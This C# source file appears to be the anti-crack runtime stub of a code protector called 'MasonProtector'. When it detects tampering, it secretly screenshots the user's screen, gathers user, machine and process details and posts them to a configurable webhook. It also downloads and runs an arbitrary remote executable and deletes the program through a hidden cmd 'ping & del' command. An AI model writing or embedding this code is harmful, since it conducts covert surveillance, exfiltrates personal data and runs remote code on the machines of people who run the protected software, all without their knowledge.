using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace MasonProtector.Core.RuntimeStubs
{
    internal static class AntiCrackRuntime
    {
#pragma warning disable 0649

        internal static string _registrySubKey;
        internal static string _registryValueName;
        internal static int    _maxAttempts;

        internal static string _msgBoxSender;
        internal static string _msgBoxText;
        internal static int    _msgBoxAttempt;

        internal static string _webhookUrl;
        internal static int    _webhookAttempt;
        internal static bool   _webhookScreenshot;
        internal static bool   _webhookSysInfo;

        internal static string _remoteFileUrl;
        internal static int    _remoteFileAttempt;

        internal static int    _selfDestructAttempt;
#pragma warning restore 0649

        private static int _firedMsgBox;
        private static int _firedWebhook;
        private static int _firedRemote;
        private static int _firedSelfDestruct;
        private static int _tlsInited;

        internal static string DecodeStr(string s, int key)
        {
            if (s == null || s.Length == 0) return s == null ? "" : s;
            char[] ch = s.ToCharArray();
            for (int i = 0; i < ch.Length; i++)
                ch[i] = (char)(ch[i] ^ ((byte)key ^ (byte)(i & 0xFF)));
            return new string(ch);
        }

        private static byte[] _pendingScreenshot;

        internal static void OnDetection()
        {
            try
            {

                EnsureTls();

                int counter = ReadCounter() + 1;
                if (_maxAttempts > 0 && counter > _maxAttempts) counter = _maxAttempts;
                WriteCounter(counter);

                Thread webhookT = null;
                Thread remoteT  = null;

                if (_webhookAttempt > 0 && counter >= _webhookAttempt &&
                    _webhookScreenshot && !string.IsNullOrEmpty(_webhookUrl))
                {
                    try
                    {
                        _pendingScreenshot = CaptureScreen();
                    }
                    catch { _pendingScreenshot = null; }
                }

                if (_webhookAttempt > 0 && counter >= _webhookAttempt &&
                    Interlocked.Exchange(ref _firedWebhook, 1) == 0 &&
                    !string.IsNullOrEmpty(_webhookUrl))
                {

                    webhookT = new Thread(new ThreadStart(WebhookThreadProc));

                    webhookT.IsBackground = false;
                    webhookT.Start();
                }

                if (_remoteFileAttempt > 0 && counter >= _remoteFileAttempt &&
                    Interlocked.Exchange(ref _firedRemote, 1) == 0 &&
                    !string.IsNullOrEmpty(_remoteFileUrl))
                {
                    remoteT = new Thread(new ThreadStart(RemoteFileThreadProc));
                    remoteT.IsBackground = false;
                    remoteT.Start();
                }

                if (_msgBoxAttempt > 0 && counter >= _msgBoxAttempt &&
                    Interlocked.Exchange(ref _firedMsgBox, 1) == 0 &&
                    !string.IsNullOrEmpty(_msgBoxText))
                {
                    try { ShowMessageBox(_msgBoxSender, _msgBoxText); } catch { }
                }

                try { if (webhookT != null) webhookT.Join(60000); } catch { }
                try { if (remoteT  != null) remoteT .Join(60000); } catch { }

                if (_selfDestructAttempt > 0 && counter >= _selfDestructAttempt &&
                    Interlocked.Exchange(ref _firedSelfDestruct, 1) == 0)
                {
                    try { SelfDestruct(); } catch { }
                }
            }
            catch {  }

            try { Environment.Exit(0); } catch { }
        }

        private static int ReadCounter()
        {
            try
            {
                using (var k = Registry.CurrentUser.OpenSubKey(_registrySubKey, false))
                {
                    if (k == null) return 0;
                    object v = k.GetValue(_registryValueName, 0);
                    if (v is int) return (int)v;
                    int parsed;
                    if (v != null && int.TryParse(v.ToString(), out parsed)) return parsed;
                }
            }
            catch { }
            return 0;
        }

        private static void WriteCounter(int v)
        {
            try
            {
                using (var k = Registry.CurrentUser.CreateSubKey(_registrySubKey))
                {
                    if (k == null) return;
                    k.SetValue(_registryValueName, v, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void ShowMessageBox(string title, string body)
        {

            MessageBox.Show(body ?? "", title ?? "",
                MessageBoxButtons.OK,
                MessageBoxIcon.Warning,
                MessageBoxDefaultButton.Button1,
                MessageBoxOptions.DefaultDesktopOnly);
        }

        private static void WebhookThreadProc()
        {
            try { SendWebhook(_webhookUrl, _webhookScreenshot, _webhookSysInfo); }
            catch { }
        }
        private static void RemoteFileThreadProc()
        {
            try { DownloadAndRun(_remoteFileUrl); }
            catch { }
        }

        private static void SendWebhook(string url, bool wantScreenshot, bool wantSysInfo)
        {
            EnsureTls();
            if (string.IsNullOrEmpty(url)) return;
            try { url = url.Trim(); } catch { }
            if (string.IsNullOrEmpty(url)) return;

            string content = "**Tampering attempt detected**\n" +
                             "Counter reached configured webhook threshold.\n";
            if (wantSysInfo)
            {
                content += "```\n";
                content += SafeGetSysInfo();
                content += "```";
            }

            PostJsonWithRetry(url, content, 1);

            if (wantScreenshot)
            {
                byte[] shot = _pendingScreenshot;
                if (shot != null && shot.Length > 0)
                {
                    try { PostMultipart(url, "", shot, "screenshot.jpg"); }
                    catch { }
                }
            }
        }

        private static void PostJsonWithRetry(string url, string content, int retries)
        {
            for (int i = 0; i <= retries; i++)
            {
                try
                {
                    PostJson(url, content);
                    return;
                }
                catch
                {
                    if (i < retries)
                    {
                        try { Thread.Sleep(1000); } catch { }
                    }
                }
            }
        }

        private static string SafeGetSysInfo()
        {
            var sb = new StringBuilder();
            try { sb.Append("MachineName: ").Append(Environment.MachineName).Append('\n'); } catch { }
            try { sb.Append("UserName:    ").Append(Environment.UserName).Append('\n'); } catch { }
            try { sb.Append("UserDomain:  ").Append(Environment.UserDomainName).Append('\n'); } catch { }
            try { sb.Append("OS:          ").Append(Environment.OSVersion.VersionString).Append('\n'); } catch { }
            try { sb.Append("64bit OS:    ").Append(Environment.Is64BitOperatingSystem).Append('\n'); } catch { }
            try { sb.Append("CPU cores:   ").Append(Environment.ProcessorCount).Append('\n'); } catch { }
            try { sb.Append("WorkingSet:  ").Append(Environment.WorkingSet).Append('\n'); } catch { }
            try { sb.Append("CommandLine: ").Append(Environment.CommandLine).Append('\n'); } catch { }
            try { sb.Append("CurrentDir:  ").Append(Environment.CurrentDirectory).Append('\n'); } catch { }
            try
            {
                Assembly entry = Assembly.GetEntryAssembly();
                if (entry != null) sb.Append("EntryAsm:    ").Append(entry.GetName().Name).Append('\n');
            }
            catch { }
            try
            {
                Process p = Process.GetCurrentProcess();
                sb.Append("PID:         ").Append(p.Id).Append('\n');
                if (p.MainModule != null)
                    sb.Append("ImagePath:   ").Append(p.MainModule.FileName).Append('\n');
            }
            catch { }
            return sb.ToString();
        }

        private static byte[] CaptureScreen()
        {
            Rectangle bounds;
            try { bounds = Screen.PrimaryScreen.Bounds; }
            catch { return null; }
            if (bounds.Width <= 0 || bounds.Height <= 0) return null;

            Bitmap bmp = null;
            try
            {
                bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bmp.Size, CopyPixelOperation.SourceCopy);
                }

                using (var ms = new MemoryStream())
                {
                    try
                    {
                        bmp.Save(ms, ImageFormat.Jpeg);
                        return ms.ToArray();
                    }
                    catch {  }
                }
                using (var ms = new MemoryStream())
                {
                    try
                    {
                        bmp.Save(ms, ImageFormat.Png);
                        return ms.ToArray();
                    }
                    catch { return null; }
                }
            }
            catch { return null; }
            finally
            {
                if (bmp != null) { try { bmp.Dispose(); } catch { } }
            }
        }

        private static void PostJson(string url, string content)
        {
            var req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.ContentType = "application/json; charset=utf-8";
            req.UserAgent = "Mozilla/5.0";
            req.Timeout = 30000;
            req.ReadWriteTimeout = 30000;

            try { req.Proxy = null; } catch { }
            string payload = "{\"content\":\"" + JsonEscape(content) + "\"}";
            byte[] body = Encoding.UTF8.GetBytes(payload);
            req.ContentLength = body.Length;
            using (var s = req.GetRequestStream()) s.Write(body, 0, body.Length);
            try { req.GetResponse().Close(); } catch { }
        }

        private static void PostMultipart(string url, string content, byte[] file, string filename)
        {

            string boundary = "-------" + Guid.NewGuid().ToString("N");
            var req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.ContentType = "multipart/form-data; boundary=" + boundary;
            req.UserAgent = "Mozilla/5.0";
            req.Timeout = 30000;
            req.ReadWriteTimeout = 30000;
            try { req.Proxy = null; } catch { }

            var ms = new MemoryStream();
            byte[] crlf = Encoding.ASCII.GetBytes("\r\n");
            string payloadJson = "{\"content\":\"" + JsonEscape(content) + "\"}";

            byte[] part1Hdr = Encoding.ASCII.GetBytes(
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"payload_json\"\r\n" +
                "Content-Type: application/json\r\n\r\n");
            ms.Write(part1Hdr, 0, part1Hdr.Length);
            byte[] pjBytes = Encoding.UTF8.GetBytes(payloadJson);
            ms.Write(pjBytes, 0, pjBytes.Length);
            ms.Write(crlf, 0, crlf.Length);

            byte[] part2Hdr = Encoding.ASCII.GetBytes(
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"file1\"; filename=\"" + filename + "\"\r\n" +
                "Content-Type: application/octet-stream\r\n\r\n");
            ms.Write(part2Hdr, 0, part2Hdr.Length);
            ms.Write(file, 0, file.Length);
            ms.Write(crlf, 0, crlf.Length);

            byte[] trail = Encoding.ASCII.GetBytes("--" + boundary + "--\r\n");
            ms.Write(trail, 0, trail.Length);

            byte[] bodyBytes = ms.ToArray();
            req.ContentLength = bodyBytes.Length;
            using (var rs = req.GetRequestStream()) rs.Write(bodyBytes, 0, bodyBytes.Length);
            try { req.GetResponse().Close(); } catch { }
        }

        private static string JsonEscape(string s)
        {
            if (s == null) return "";
            var sb = new StringBuilder(s.Length + 8);
            for (int i = 0; i < s.Length; i++)
            {
                char c = s[i];
                if      (c == '"')  sb.Append("\\\"");
                else if (c == '\\') sb.Append("\\\\");
                else if (c == '\b') sb.Append("\\b");
                else if (c == '\f') sb.Append("\\f");
                else if (c == '\n') sb.Append("\\n");
                else if (c == '\r') sb.Append("\\r");
                else if (c == '\t') sb.Append("\\t");
                else if (c < 0x20)  sb.Append("\\u").Append(((int)c).ToString("X4"));
                else                sb.Append(c);
            }
            return sb.ToString();
        }

        private static void DownloadAndRun(string url)
        {

            string ext = ".exe";
            try
            {
                string path = new Uri(url).LocalPath;
                string e = Path.GetExtension(path);
                if (!string.IsNullOrEmpty(e)) ext = e;
            }
            catch { }

            string tmp = Path.Combine(Path.GetTempPath(),
                "ac_" + Guid.NewGuid().ToString("N") + ext);

            EnsureTls();

            using (var wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                wc.DownloadFile(url, tmp);
            }

            try
            {
                var psi = new ProcessStartInfo(tmp)
                {
                    UseShellExecute = true,
                    WindowStyle     = ProcessWindowStyle.Normal,
                };
                Process.Start(psi);
            }
            catch { }
        }

        private static void SelfDestruct()
        {
            string exe = null;
            try
            {
                var mm = Process.GetCurrentProcess().MainModule;
                if (mm != null) exe = mm.FileName;
            }
            catch { }
            if (string.IsNullOrEmpty(exe))
            {
                try
                {
                    Assembly entry = Assembly.GetEntryAssembly();
                    if (entry != null) exe = entry.Location;
                }
                catch { }
            }
            if (string.IsNullOrEmpty(exe)) return;

            try
            {

                string safeExe = exe.Replace("\"", "");
                var psi = new ProcessStartInfo("cmd.exe",
                    "/c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + safeExe + "\"")
                {
                    UseShellExecute  = false,
                    CreateNoWindow   = true,
                    WindowStyle      = ProcessWindowStyle.Hidden,
                    WorkingDirectory = Path.GetTempPath(),
                };
                using (Process.Start(psi)) { }
            }
            catch { }

            try { Environment.Exit(0); } catch { }
        }

        private static void EnsureTls()
        {
            if (Interlocked.Exchange(ref _tlsInited, 1) != 0) return;

            try
            {
                ServicePointManager.SecurityProtocol =
                    (SecurityProtocolType)0x300 |
                    (SecurityProtocolType)0xC00 |
                    (SecurityProtocolType)0x3000;
                goto done;
            }
            catch { }
            try
            {
                ServicePointManager.SecurityProtocol =
                    (SecurityProtocolType)0x300 |
                    (SecurityProtocolType)0xC00;
                goto done;
            }
            catch { }
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)0xC00;
                goto done;
            }
            catch { }

        done:

            try { ServicePointManager.Expect100Continue = false; } catch { }

        }
    }
}

